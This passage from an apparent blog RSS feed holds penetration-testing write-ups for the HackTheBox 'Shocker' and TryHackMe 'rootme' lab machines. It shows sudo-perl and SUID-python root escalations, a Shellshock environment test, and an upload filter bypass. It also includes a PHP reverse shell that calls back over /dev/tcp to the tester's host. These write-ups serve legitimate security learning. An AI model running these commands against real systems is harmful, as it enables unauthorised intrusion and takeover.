-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
-sudo -l
-Matching Defaults entries <span class="k">for</span> shelly on Shocker:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User shelly may run the following commands on Shocker:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
-</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
-<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
-root@Shocker:/home/shelly# id <span class="o">&amp;&amp;</span> hostname
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-Shocker
-root@Shocker:/home/shelly#
-</code></pre></div><p>The root flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
-e3689b13acb2...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h2 id="explore">Explore</h2>
-<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe it a little more.</p>
-<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
-<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
-root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
-</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
-<p><div class="img-container"><img src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  /></div>
-</p>
-<p>The full response</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
-<span class="n">Date</span><span class="o">:</span> <span class="l">Sun, 11 Jul 2021 03:06:31 GMT</span>
-<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.18 (Ubuntu)</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/x-sh</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">1113</span>
-
-iamf
-test
-SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
-
-HTTP_USER_AGENT=Blackhole
-SERVER_PORT=80
-HTTP_HOST=10.10.10.56
-DOCUMENT_ROOT=/var/www/html
-SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
-REQUEST_URI=/cgi-bin/iamf.sh
-SCRIPT_NAME=/cgi-bin/iamf.sh
-HTTP_CONNECTION=close
-REMOTE_PORT=58222
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
-CONTEXT_PREFIX=/cgi-bin/
-PWD=/usr/lib/cgi-bin
-SERVER_ADMIN=webmaster@localhost
-REQUEST_SCHEME=http
-HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
-HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
-HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-REMOTE_ADDR=10.10.14.83
-SHLVL=1
-SERVER_NAME=10.10.10.56
-CONTENT_LENGTH=0
-SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
-QUERY_STRING=
-SERVER_ADDR=10.10.10.56
-GATEWAY_INTERFACE=CGI/1.1
-HTTP_UPGRADE_INSECURE_REQUESTS=1
-SERVER_PROTOCOL=HTTP/1.1
-HTTP_CACHE_CONTROL=max-age=0
-HTTP_ACCEPT_ENCODING=gzip, deflate
-REQUEST_METHOD=GET
-CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
-HTTP_IAMF_HEADER=() {  :
-}
-_=/usr/bin/env
-</code></pre></div><hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
-<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>TryHackMe - rootme</title>
-      <link>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</link>
-      <pubDate>Fri, 02 Jul 2021 22:08:48 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</guid>
-      <description>A ctf for beginners, can you root me?</description>
-      <content:encoded><![CDATA[<fieldset>
-<legend>Room Information </legend>
-<ul>
-<li><strong>Name:</strong>  <a href="https://tryhackme.com/room/rrootme">rootme</a></li>
-<li><strong>Category:</strong> Boot2root</li>
-<li><strong>Difficulty:</strong> Easy</li>
-<li><strong>Tools:</strong>
-<ul>
-<li>Nmap</li>
-<li>Gobuster</li>
-</ul>
-</li>
-<li><strong>Skills Learned</strong>:
-<ul>
-<li>Web enumeration</li>
-<li>SUID exploitation</li>
-</ul>
-</li>
-</ul>
-</fieldset>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115» 
-$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.215.165                      
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 23:35 EDT
-Nmap scan report <span class="k">for</span> 10.10.215.165
-Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.26s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-Reason: <span class="m">65533</span> resets
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
-80/tcp open  http    syn-ack ttl <span class="m">63</span>
-
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 96.24 seconds
-</code></pre></div><p>Running a script scan didn&rsquo;t really helpful, so I&rsquo;ll dig the website on port 80.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Visiting the website doesn&rsquo;t display anything except a prompt-like text &ldquo;root@rootme:~#&rdquo;.</p>
-<p><div class="img-container"><img src="imgs/image-20210530105241967.png" alt="image-20210530105241967"  /></div>
-</p>
-<h4 id="gobuster">Gobuster</h4>
-<p>A <code>Gobuster</code> scan discovers several directories on this website, ones of which interesting are <code>/uploads</code> and <code>/panel</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115» 
-$ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.215.165/
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/05/29 23:37:44 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/js/<span class="o">]</span>
-/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/css/<span class="o">]</span>
-/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/uploads/<span class="o">]</span>
-/panel                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/panel/<span class="o">]</span>  
-/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>                 
-<span class="o">===============================================================</span>
-2021/05/29 23:43:21 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></div><h4 id="panel">/panel</h4>
-<p>On <code>/panel</code>, there is an upload form, but it blocks a file with <code>.php</code> extensions.</p>
-<p><div class="img-container"><img src="imgs/image-20210530105345640.png" alt="image-20210530105345640"  /></div>
-</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="upload-filter-bypass">Upload filter bypass</h4>
-<p>Uploading a file with extension <code>.phtml</code> bypasses the upload filter. The uploaded file can be found at <code>/uploads/[here]</code>.</p>
-<p><div class="img-container"><img src="imgs/image-20210530105538891.png" alt="image-20210530105538891"  /></div>
-</p>
-<h4 id="reverse-shell">Reverse shell</h4>
-<p>I&rsquo;ll upload the following file and setup a listener to get a shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115»  
-$ cat iamf.phtml    
-&lt;?php
-system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.30.115/443 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
-</code></pre></div><p>I&rsquo;ll trigger reverse shell by visiting <code> http://10.10.215.165/uploads/iamf.phtml</code> on the browser.</p>
-<p><div class="img-container"><img src="imgs/image-20210530105644738.png" alt="image-20210530105644738"  /></div>
-</p>
-<h4 id="shell-upgrade">Shell upgrade</h4>
-<p>I&rsquo;ll do the PTY trick to upgrade my shell to interactive one.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@rootme:/var/www/html$ which python
-which python
-/usr/bin/python
-www-data@rootme:/var/www/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-www-data@rootme:/var/www/html$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-bash-4.4$ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> suspended  nc -nvlp <span class="m">443</span>
-→ root@kali «rootme» «10.9.30.115» 
-$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> continued  nc -nvlp <span class="m">443</span>
-
-bash-4.4$ 
-</code></pre></div><p>The user flag can be found at <code>/var/www/user.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ find / -type f -user www-data 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|sys&#39;</span>
-...
-/var/www/user.txt
-...
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
-<p>I find out the current Python binary has SUID bit set.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;snap&#39;</span>
-...
-/usr/bin/python
-...
-</code></pre></div><p>Python with SUID can be exploited by executing <code>import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
-bash-4.4# id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210530111120071.png" alt="image-20210530111120071"  /></div>
-</p>
-<p>I can grab the root flag now.</p>
-<p><div class="img-container"><img src="imgs/image-20210530111235501.png" alt="image-20210530111235501"  /></div>
-</p>
-<hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></li>
 </ul>
 ]]></content:encoded>
     </item>
